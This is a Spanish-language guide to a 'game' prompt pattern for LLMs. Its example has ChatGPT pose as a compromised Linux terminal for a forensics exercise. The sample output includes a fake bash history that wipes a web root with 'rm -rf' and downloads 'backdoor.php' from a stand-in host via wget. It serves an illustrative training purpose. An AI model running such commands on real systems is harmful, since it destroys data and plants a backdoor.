# Patrón de Juego

## Intención y Contexto

La intención de este patrón es crear un juego en torno a un tema determinado. El patrón puede combinarse con el Generador de Visualización para añadir imágenes al juego. El juego se centra en un tema específico y el LLM guiará el juego. Este patrón es particularmente efectivo cuando las reglas del juego son relativamente limitadas en alcance, pero se espera que el contenido del juego sea amplio. El usuario puede especificar un conjunto limitado de reglas y luego el LLM puede automatizar la generación de contenidos para el juego.

## Motivación

Te gustaría que el LLM generase escenarios o preguntas en torno a un tema específico y requerir que los usuarios apliquen habilidades de resolución de problemas u otras habilidades para lograr una tarea relacionada con el escenario. Generar todo el contenido para el juego manualmente sería demasiado tedioso, sin embargo, te gustaría que el LLM aplicase su conocimiento sobre el tema para guiar la generación de contenido.

## Estructura e Ideas Clave

Declaraciones contextuales fundamentales:

|Declaraciones Contextuales
|-|
Crea un juego para mí en torno a X
Una o más reglas fundamentales del juego

La primera declaración instruye al LLM a crear un juego y proporciona el enfoque importante del juego a un área temática. Una de las capacidades importantes del patrón es que permite al usuario crear juegos describiendo las reglas del juego, sin tener que determinar el contenido del juego. Cuanto más específico sea el tema, típicamente el juego será más novedoso e interesante.

La segunda declaración presenta las reglas del juego al LLM. Es importante que las reglas se ajusten a las capacidades del LLM. Los juegos textuales que dependen de secuencias de texto de entrada y salida funcionan mejor. Uno de los atributos clave del patrón es que el texto de entrada puede ser rico y expresivo, lo que puede llevar a interfaces interesantes para el juego. Por ejemplo, el usuario podría expresar acciones en el juego como scripts que dictan una secuencia de acciones complejas, como "obtener un listado de toda la actividad de la red y comprobar si hay anomalías", lo que va más allá del alcance de las entradas de opción múltiple o respuesta corta. Cada regla debe proporcionarse como una declaración separada con respecto a algún aspecto del juego.

## Ejemplo de Implementación

A continuación se muestra un ejemplo de un juego sobre ciberseguridad:

> "Vamos a jugar a un juego de ciberseguridad. Vas a pretender ser un terminal Linux de un ordenador que ha sido comprometido por un atacante. Cuando escriba un comando, vas a mostrar el texto correspondiente que el terminal Linux produciría. Voy a usar comandos para intentar descubrir cómo fue comprometido el sistema. El ataque debería haber hecho una o más de las siguientes cosas: (1) lanzado nuevos procesos, (2) cambiado archivos, (3) abierto nuevos puertos para recibir comunicación, (4) creado nuevas conexiones salientes, (5) cambiado contraseñas, (6) creado nuevas cuentas de usuario, o (7) leído y robado información. Para comenzar el juego, imprime un escenario de lo que sucedió que llevó a mi investigación y haz que la descripción tenga pistas que pueda usar para comenzar."

Este juego de ciberseguridad combina varios patrones, incluyendo el de Juego y el de Personalidad. La personalidad del terminal Linux que se elige para el juego [ha sido discutida en muchas publicaciones en Internet](https://www.engraved.blog/building-a-virtual-machine-inside/). Este juego personaliza aún más la personalidad de Linux discutida para actuar como un terminal Linux de un ordenador comprometido por un ciberataque. ChatGPT responde a los comandos de Linux con las salidas del terminal apropiadas y sintetiza un sistema de archivos falso que tiene pistas sobre un ciberataque.

Una muestra de la salida de este juego con ChatGPT después de escribir "ls -alt", el comando de Linux para generar una lista de archivos en el directorio actual se muestra a continuación (los permisos han sido eliminados por razones de formato):

```
total 56
 5 user user  4096 Feb 16 14:31 .
 1 user user 18881 Feb 16 14:31 .bash_history
43 user user  4096 Feb 16 14:30 ..
 1 user user  1178 Aug 15  2022 .bashrc
 1 user user   220 Aug 15  2022 .bash_logout
 3 user user  4096 Feb 16 14:25 .gnupg
 1 user user  4041 Feb 15 17:52 README.md
 2 user user  4096 Feb 1  11:35 project
```

Cuando el usuario luego escribió el comando "cat .bash history", para mostrar el contenido del archivo de registro que muestra los comandos ejecutados por el usuario, ChatGPT respondió con:

```
cd /var/www/html
sudo rm -rf *
sudo wget https://example.com/backdoor.php
sudo chmod 777 backdoor.php
exit
ls -alt
ps -ef
netstat -tulnp
```

En la salida anterior, ChatGPT generó un archivo de registro falso con comandos realistas para eliminar los datos que están siendo servidos por el servidor web en /var/www/html y reemplazar el contenido con una puerta trasera en el sistema.

## Consecuencias

Este patrón se puede combinar eficazmente con los patrones [Persona](persona.md), [Generación Infinita](generacionInfinita.md) y [Generador de Visualización](generadorDeVisualizacion.md). Por ejemplo, el juego de ciberseguridad utiliza el patrón de Persona para que el LLM pueda hacerse pasar por un terminal Linux. Para un juego de seguridad de red, el Generador de Visualización podría emplearse para agregar la capacidad de visualizar la topología de la red y los flujos de tráfico.
